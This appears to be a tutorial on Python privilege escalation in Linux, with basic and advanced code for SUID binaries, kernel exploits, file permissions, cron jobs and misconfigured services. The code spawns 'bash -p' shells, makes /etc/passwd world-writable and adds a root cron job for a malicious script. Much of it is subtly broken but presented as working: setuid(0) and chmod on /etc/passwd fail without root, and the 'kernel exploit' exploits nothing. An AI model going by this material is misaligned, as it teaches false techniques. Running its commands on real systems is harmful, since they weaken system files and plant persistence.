Welcome to this advanced guide on Python-based techniques for privilege escalation in Linux systems. This resource is crafted to enhance your ethical hacking skills, focusing on using Python within a Kali Linux environment. Always ensure you operate in a controlled environment and with explicit authorization.
Introduction to Privilege Escalation

Understanding privilege escalation is vital for ethical hackers. It involves methods that allow an attacker to gain elevated access to resources that are typically restricted. The techniques covered here will include:

    SUID Binaries: Executables that allow users to run them with the permissions of the file owner.
    Kernel Vulnerabilities: Exploiting flaws in the kernel to elevate privileges.
    File Permission Manipulation: Changing file permissions to access restricted files.
    Cron Jobs: Targeting scheduled tasks that may be configured insecurely.
    Weakly Configured Services: Services running with excessive privileges but lacking proper security measures.

Ethical Considerations

Important Reminder: The techniques discussed in this guide are for educational purposes only. Always conduct your activities within legal and ethical boundaries, ensuring you have the necessary permissions.
Techniques Overview

    Exploiting SUID Binaries
    Kernel Exploits
    File Permission Manipulation
    Privilege Escalation via Cron Jobs
    Exploiting Weakly Configured Services

1. Exploiting SUID Binaries

SUID (Set User ID) binaries can be exploited to execute commands with the privileges of the binary's owner.
Basic Code Example

import os

# Initiating a shell with elevated privileges
os.system("/bin/bash -p")

Advanced Code Implementation

import ctypes

# Load the C standard library
libc = ctypes.CDLL("libc.so.6")

# Set user ID to root
libc.setuid(0)

# Initiate a privileged shell
libc.system("/bin/bash -p")

2. Kernel Exploits

Kernel exploits take advantage of vulnerabilities within the operating system's kernel to gain higher privileges.
Basic Code Example

import os

# Creating a payload to exploit a vulnerability
payload = b"\x90" * 64  # NOP sled for demonstration
with open("/dev/vuln_device", "wb") as f:
    f.write(payload)

# Escalate privileges
os.system("/bin/bash -p")

Advanced Code Implementation

import ctypes

# Load the C standard library
libc = ctypes.CDLL("libc.so.6")

# Set user ID to root
libc.setuid(0)

# Write payload to a vulnerable device
payload = b"\x90" * 64  # NOP sled for demonstration
with open("/dev/vuln_device", "wb") as f:
    f.write(payload)

# Launch a privileged shell
libc.system("/bin/bash -p")

3. File Permission Manipulation

Manipulating file permissions can allow unauthorized access to sensitive files.
Basic Code Example

import os

# Change permissions to make /etc/passwd writable
os.system("chmod 777 /etc/passwd")

# Open a shell with elevated privileges
os.system("/bin/bash -p")

Advanced Code Implementation

import ctypes
import os
import stat

# Load the C standard library
libc = ctypes.CDLL("libc.so.6")

# Set user ID to root
libc.setuid(0)

# Change permissions of the target file
file_path = "/etc/passwd"
os.chmod(file_path, stat.S_IRWXU | stat.S_IRWXG | stat.S_IRWXO)

# Open a privileged shell
libc.system("/bin/bash -p")

4. Privilege Escalation via Cron Jobs

Cron jobs can be exploited if they are poorly configured, allowing for the execution of unauthorized scripts.
Basic Code Example

import os

# Add a malicious script to the crontab
os.system("echo '* * * * * root /usr/local/bin/malicious_script' >> /etc/crontab")

# Initiate a privileged shell
os.system("/bin/bash -p")

Advanced Code Implementation

import ctypes
import os
import shutil

# Load the C standard library
libc = ctypes.CDLL("libc.so.6")

# Set user ID to root
libc.setuid(0)

# Path for the malicious script
malicious_script_path = "/usr/local/bin/malicious_script"
shutil.copyfile("/path/to/your/malicious_script", malicious_script_path)

# Make the script executable and add it to crontab
os.system(f"chmod +x {malicious_script_path}")
os.system("echo '* * * * * root /usr/local/bin/malicious_script' >> /etc/crontab")
libc.system("/bin/bash -p")

5. Exploiting Weakly Configured Services

Services that run with elevated privileges can be exploited if they are misconfigured.
Basic Code Example

import os

# Start a weakly configured service
os.system("sudo /usr/sbin/service weak_service start")

# Initiate a privileged shell
os.system("/bin/bash -p")

Advanced Code Implementation

import ctypes
import os
import subprocess

# Load the C standard library
libc = ctypes.CDLL("libc.so.6")

# Set user ID to root
libc.setuid(0)

# Start the vulnerable service
subprocess.call(["sudo", "/usr/sbin/service", "weak_service", "start"])

# Open a privileged shell
libc.system("/bin/bash -p")

Conclusion

The techniques outlined in this guide illustrate various methods for privilege escalation using Python in Linux environments. Remember, these techniques must only be used in ethical hacking contexts with explicit permission. Always prioritize ethical standards and adhere to legal regulations in your security assessments. Happy learning and hacking responsibly!
